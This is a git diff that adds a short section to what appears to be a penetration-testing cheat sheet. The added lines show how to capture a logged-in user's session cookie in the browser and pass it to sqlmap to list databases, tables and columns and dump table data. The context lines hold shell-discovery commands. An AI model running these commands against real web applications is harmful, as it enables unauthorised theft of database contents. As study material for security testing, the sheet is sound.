@@ -86,6 +86,16 @@ sqlmap -u "http://www.xyz.com/profile.aspx?id=1" --cookie="[cookie value that yo
 6.1 In the shell type-   TASKLIST  (to view the tasks)
 6.2 Use systeminfo for windows to get all os version
 6.3 Use uname -a for linux to get os version
+
+Example to extract data from database
+Open browser and login to web application
+Open inspector and type document.cookie
+$ sqlmap -u "URL" --cookie="captured cookie of looged in user" --dbs    #for Database
+$ sqlmap -u "URL" --cookie="captured cookie of looged in user" -D *DATABASE NAME* --tables			 #for Tables of selected Database
+$ sqlmap -u "URL" --cookie="captured cookie of looged in user" -D *DATABASE NAME* -T *TABLE NAME* --columns 	 #for Column names
+$ sqlmap -u "URL" --cookie="captured cookie of looged in user" -D *DATABASE NAME* -T *TABLE NAME* --dump 	 #dump table data
+
+
 ```
 # Android
 ```
